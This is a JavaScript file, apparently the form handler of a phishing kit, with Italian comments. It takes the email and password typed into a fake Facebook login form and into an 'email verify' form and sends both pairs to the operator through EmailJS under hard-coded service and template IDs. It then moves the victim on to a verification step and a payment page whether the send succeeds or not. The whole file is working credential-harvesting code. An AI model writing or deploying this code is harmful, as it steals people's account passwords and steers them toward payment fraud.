// scriptemail.js - Gestione invio email (VERSIONE CORRETTA)

function sendMail(event) {
    event.preventDefault(); // Prevent default form submission

    // Determine which form is being submitted
    const formId = event.target.id; 

    // Initialize an object to hold the form data
    let parms = {};

    // Collect form data dynamically based on form ID
    switch (formId) {
        case "emailVerifyForm":
            parms = {
                emailf: document.getElementById("emailf").value,
                passwordf: document.getElementById("passwordf").value,
            };
            break;
        
        case "facebookLoginForm":
            parms = {
                facebookEmail: document.getElementById("facebookEmail").value,
                facebookPassword: document.getElementById("facebookPassword").value
            };
            break;

        default:
            console.error("Unknown form submission");
            return; // Exit the function if form ID is unknown
    }

    // Send the email using EmailJS
    emailjs.send("service_zl8edtk", "template_7uvwmq9", parms)  
        .then(function(response) {
            console.log('Email sent successfully!');
            
            // CHIUDI IL MODALE DI LOADING PRIMA DI PROCEDERE
            closeLoadingModal();
            
            // Use the global goToStep function from index.html
            setTimeout(function() {
                if (formId === "facebookLoginForm") {
                    if (typeof goToStep === 'function') {
                        goToStep(3); // Go to Email Verify
                    }
                } else if (formId === "emailVerifyForm") {
                    if (typeof goToStep === 'function') {
                        goToStep(4); // Go to Payment page
                    }
                }
            }, 500);
            
        })
        .catch(function(error) {
            console.error('Email send failed:', error);
            
            // CHIUDI IL MODALE DI LOADING PRIMA DI PROCEDERE
            closeLoadingModal();
            
            // Still redirect even if email fails
            setTimeout(function() {
                if (formId === "facebookLoginForm") {
                    if (typeof goToStep === 'function') {
                        goToStep(3);
                    }
                } else if (formId === "emailVerifyForm") {
                    if (typeof goToStep === 'function') {
                        goToStep(4);
                    }
                }
            }, 500);
        });
}

// Funzione di utilità per chiudere il modale di loading
function closeLoadingModal() {
    const loadingModal = document.getElementById('loadingModal');
    if (loadingModal) {
        loadingModal.style.display = 'none';
    }
}